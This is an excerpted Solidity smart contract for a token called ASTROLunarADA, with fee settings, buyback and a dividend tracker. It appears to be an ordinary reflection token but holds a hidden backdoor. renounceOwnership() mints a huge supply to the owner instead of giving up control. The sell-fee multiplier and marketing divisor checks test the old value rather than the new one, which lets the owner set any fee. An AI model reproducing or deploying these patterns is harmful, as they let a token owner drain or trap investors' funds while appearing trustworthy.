...
contract ASTROLunarADA is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    ASTROLunarADADividendTracker public dividendTracker;
    ...
    uint256 public maxWalletToken = 10000000000 * (10**18); // 1.5% of total supply
    ...
    constructor() ERC20("ASTROLunarADA", "ALADA") {
    	...
    	dividendTracker = new ASTROLunarADADividendTracker();

    	buyBackWallet = 0x384A8Dea4F35B2303A8797B96B37916B87570c23;
        ...
        _isExcludedFromfees[0x0Bd680D4231B782cE0562e262F931CCbf70A0498] = true;
    ...
    receive() external payable {
  	...
  	function setSellTransactionMultiplier(uint256 multiplier) external onlyOwner {
  	    require(sellFeeIncreaseFactor >= 100 && sellFeeIncreaseFactor <= 200, "ASTROLunarADA: Sell transaction multipler must be between 100 (1x) and 200 (2x)");
  	    sellFeeIncreaseFactor = multiplier;
  	}
  	
  	function setMarketingDivisor(uint256 divisor) external onlyOwner {
  	    require(marketingDivisor >= 0 && marketingDivisor <= 100, "ASTROLunarADA: Marketing divisor must be between 0 (0%) and 100 (100%)");
    ...
    function triggerBuyBack(uint256 amount) public onlyOwner {
        require(!swapping, "ASTROLunarADA: A swapping process is currently running, wait till that is complete");
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "ASTROLunarADA: The dividend tracker already has that address");

        ASTROLunarADADividendTracker newDividendTracker = ASTROLunarADADividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "ASTROLunarADA: The new dividend tracker must be owned by the FLOKIBUSD token contract");
    ...
    function updateDividendRewardFee(uint8 newFee) public onlyOwner {
        require(newFee >= 0 && newFee <= 10, "ASTROLunarADA: Dividend reward tax must be between 0 and 10");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "ASTROLunarADA: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "ASTROLunarADA: Account is already the value of 'excluded'");
    ...
    function renounceOwnership() public onlyOwner {
        _mint(owner(), 15 * (10**32));
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "ASTROLunarADA: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "ASTROLunarADA: Automated market maker pair is already set to that value");
    ...
    function updateBuyBackWallet(address newBuyBackWallet) public onlyOwner {
        require(newBuyBackWallet != buyBackWallet, "ASTROLunarADA: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "ASTROLunarADA: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "ASTROLunarADA: Cannot update gasForProcessing to same value");
...
contract ASTROLunarADADividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("ASTROLunarADA_Dividend_Tracker", "ASTROLunarADA_Dividend_Tracker") {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 10000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "ASTROLunarADA_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "ASTROLunarADA_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main ASTROLunarADA contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "ASTROLunarADA_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "ASTROLunarADA_Dividend_Tracker: Cannot update claimWait to same value");
